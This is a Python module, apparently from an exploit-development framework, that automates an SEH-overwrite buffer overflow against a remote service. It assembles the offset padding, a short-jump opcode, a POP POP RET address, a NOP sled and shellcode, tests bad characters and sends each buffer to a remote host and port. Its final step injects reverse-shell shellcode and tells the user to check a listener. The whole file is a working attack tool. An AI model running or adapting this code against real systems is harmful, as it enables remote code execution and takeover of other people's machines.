import logging
import subprocess
import sys
from struct import pack

from utils.system import System


class Seh:

    config = ""
    # offset = 0
    # overflow = 0

    buffer = ""

    def __init__(self, config):
        self.config = config

        return None

    #################################
    # SEHByPass Attributes & Function

    # offset = 1
    # nextseh = "B" * 4
    # seh = "C" * 4
    # ppr_address = ""
    # payload = "D" * 400
    # nops = 0
    # skip_seh = ""  # "\x90\x90\xeb\x06"

    def str_encode(self, string):
        if (sys.version_info >= (3, 0)):
            enc_string = str(string).encode('latin-1')
        else:
            enc_string = (string)

        return enc_string

    def stack_fit(self):

        # print("[+] Filling stack at " + str(offset))

        if (sys.version_info >= (3, 0)):
            _offset = ("A" * self.config.offset).encode('latin-1')
        else:
            _offset = ("A" * self.config.offset)

        # print(_offset)

        # if (self.config.offset):
        #     _offset = "A" * self.config.offset

        if (self.config.skip_seh != ""):
            _nextseh = self.str_encode(self.config.skip_seh)
        else:
            _nextseh = self.str_encode("B" * 4)

        if (self.config.ppr_address != ""):
            _seh = pack('<L', int("0x" + self.config.ppr_address, 16))
        else:
            _seh = self.str_encode("C" * 4)

        if (self.config.nops > 0 or self.config.nops != None):
            _nops = self.str_encode("\x90" * self.config.nops)

        if (self.config.verbose_lv == 2):
            print(_nops)
            print(type(self.str_encode("\x90" * self.config.nops)))

        # print("-" * 50)
        # print(self.config.payload)
        # print("-" * 50)

        if(self.config.payload != ""):
            _esp = self.config.payload
        else:
            _esp = self.str_encode("D" * 400)

        buffer = _offset
        buffer += _nextseh
        buffer += _seh

        if (self.config.nops > 0):
            buffer += _nops

        buffer += _esp

        # buffer += "\r\n"

        return buffer

    def exploit(self):

        try:
            adapter = System.get_adapter(self.config)

            inject_func = getattr(adapter, 'inject')

            if(self.config.offset < 2 or self.config.offset == ""):
                System.generic_fuzzer(self.config)
            else:
                print("[!] Got from session OFFSET " + str(self.config.offset))

            # self.offset = System.input(
            #     "[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")
            #
            # if (self.offset != ""):
            #     self.offset = int(self.offset)
            # else:
            #     self.offset = 0

            # if (self.overflow == 0 and self.offset == 0):
            #     self.overflow = fuzzer_func(self.config.remoteip, self.config.remoteport, self.config.field, 1000, 500)
            #
            #     print("!" * 100)
            #     print("[+] Application crashed at %s bytes" % self.overflow)
            #
            # if (self.offset == 0 and self.overflow > 0):
            #     print("[+] Generating pattern: msf-pattern_create -l %s" % self.overflow)
            #
            #     buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.overflow)]).strip()
            #
            #     gonext = System.input("[?] Press ENTER when you wanna give the shot!!! This will send the PATTERN imediately!!!")
            #
            #     # print(buffer);
            #
            #     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
            #     print("[+] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")
            #     print("[!] Hint: !mona findmsp")
            #     self.offset = System.input("[?] Check the target debugger and enter offset for NSEH Field:")

            buffer = self.stack_fit()

            if (self.config.verbose_lv >= 1):
                print("[+] Buffer is aligned in SEH record:")
                print(buffer)

            if(self.config.ppr_address == ""):
                _ppr_address = System.input("[?] Inform POP POP RET address or leave blank to receive a crafted buffer in SEH record:")

                if (_ppr_address == ""):
                    buffer = self.stack_fit()
                    gonext = System.input("[!] All set! Press ENTER when your application is ready to receive a crafted buffer :")
                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)

                    print("[+] Buffer Injected (" + str(len(buffer)) + " bytes) to test STACK FILLING!!!")
                    print("[!] Hint: !mona seh -n")
                    self.config.ppr_address = System.input("[?] Check the target debugger and enter POP POP RET address to replace SEH:")
                else:
                    self.config.ppr_address = _ppr_address

                gonext = System.input("[?] Do you wanna test the POP POP RET ? [Y/n]")
                if (gonext == "Y"):
                    buffer = self.stack_fit()
                    gonext = System.input("[!] All set! Press ENTER when your application is ready to receive POP POP RET buffer :")
                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)

            else:
                print("[!] POP POP RET Address reload from previous sessions:" + self.config.ppr_address)

            #########################################################
            # OP CODES FOR JUMPING SEH CHAIN

            if (self.config.skip_seh == "") : # or self.config.nops == 0) :

                _skip_seh = System.input("[?] Enter the OPCODE to bypass SEH + NextSEH (Hint: msf-nasm_shell> jmp short 8) [\\x90\\x90\\xeb\\x06] : ")
                if (_skip_seh == "") :
                    self.config.skip_seh = r"\x90\x90\xeb\x06"  # JMP SHORT 8
                else:
                    self.config.skip_seh = self.str_encode(_skip_seh)

                gonext = System.input("[?] Do you wanna test the OPCODE ? [Y/n]")
                if (gonext == "Y"):
                    buffer = self.stack_fit()
                    gonext = System.input("[!] All set! Press ENTER when your application is ready to receive OPCODE buffer :")
                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)

                try:
                    self.config.nops = int(System.input("[?] How many NOPS before shellcode ? [0]"))
                except:
                    self.config.nops = 0

            else:
                print("[!] OP CODES SEH BYPASS reload from previous sessions:" + self.config.skip_seh)

            #########################################################
            # BADCHARS

            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip]")

            if(gonext == "T"):
                self.config.payload = System.bytearray
                exploit = self.stack_fit()

                System.input("[?] Press any key when you wanna send the bytearray !!!")
                inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)

            if(gonext != "S"):
                bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas :")

                if ',' in bads:
                    _bads = bads.split(',')
                    for _badchar in _bads:
                        System.badchars.append(r'\x' + _badchar)
                elif bads != "":
                    System.badchars.append(r'\x' + bads)

                self.config.badchars = System.badchars

            #########################################################
            # SHELLCODE

            print("[!] Preparing Shellcode for reverse shell.....")

            self.config.payload = System.shellcode(self.config)
            exploit = self.stack_fit()
            print(exploit)
            print("[!] Spawn listener on " + self.config.localip + ":" + str(self.config.localport))
            gonext = System.input("[?] Press any key when you wanna give the shot!!! This will send the FINAL PAYLOAD now!!!")

            inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
            print("[*] Buffer Injected (" + str(len(exploit)) + " bytes)!!!")
            print("[*] Check your listener!!!")

            System.show_session(self.config)

        except Exception as err:

            logging.exception(err)
            # except Exception as e:
            # 	if hasattr(e, 'message'):
            # 		print(e.message)
            # 	else:
            # 		print(e)
            sys.exit(1)
